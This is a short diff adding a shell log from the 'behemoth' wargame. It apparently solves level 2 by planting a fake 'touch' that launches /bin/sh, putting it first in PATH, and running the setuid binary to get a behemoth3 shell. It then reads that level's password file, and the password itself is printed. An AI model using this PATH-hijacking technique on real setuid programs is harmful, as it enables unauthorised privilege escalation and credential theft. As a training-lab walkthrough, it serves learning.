@@ -1,0 +1,7 @@
+behemoth2@behemoth:/behemoth$ mkdir /tmp/try
+behemoth2@behemoth:/tmp/try$ echo '/bin/sh' > touch
+behemoth2@behemoth:/behemoth$ PATH=/tmp/try:$PATH ./behemoth2
+$ whoami
+behemoth3
+$ cat /etc/behemoth_pass/behemoth3
+nieteidiel
